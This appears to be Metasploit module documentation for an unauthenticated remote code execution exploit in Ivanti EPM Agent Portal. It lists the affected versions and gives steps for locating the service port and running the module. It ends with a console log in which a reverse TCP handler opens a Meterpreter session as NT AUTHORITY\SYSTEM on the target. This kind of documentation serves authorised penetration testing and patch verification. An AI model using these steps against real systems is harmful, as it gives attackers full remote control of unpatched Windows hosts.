## Vulnerable Application
This module leverages an unauthenticated RCE in Ivanti's EPM Agent Portal where a RPC client can invoke a method
which will run an attacker-specified string on the remote target as NT AUTHORITY\SYSTEM.
This vulnerability is present in versions prior to EPM 2021.1 Su4 and EPM 2022 Su2.

## Verification Steps

1. Install the application
1. Determine which port the vulnerable AgentPortal service is listening on. It has a non-static value.
   1. The port used by the AgentPortal service can be found in the registry at `HKLM\SOFTWARE\LANDesk\SharedComponents\LANDeskAgentPortal`
   1. Or you could scan for it and probe the high ports (testing suggests it should be in the 49000 - 50000 range).
1. Start msfconsole
1. Do: `use exploit/windows/misc/ivanti_agent_portal_cmdexec`
1. Set the `RPORT`, `PAYLOAD` and any payload-related options
1. Run the module

## Options

## Scenarios

### Ivanti 2021.1 / 11.0.4.733 on Windows Server 2022 x64

```
metasploit-framework.pr (S:3 J:0) exploit(windows/misc/ivanti_agent_portal_cmdexec) > run

[*] Powershell command length: 4205
[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] 192.168.159.130:49673 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.159.130:49673 - Connected to the remote end point
[+] 192.168.159.130:49673 - The target is vulnerable.
[*] Sending stage (176198 bytes) to 192.168.159.130
[*] Meterpreter session 11 opened (192.168.159.128:4444 -> 192.168.159.130:53627) at 2024-10-28 17:15:09 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-NJ6DUF1OCAM
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > pwd
C:\Windows\system32
meterpreter > 
```
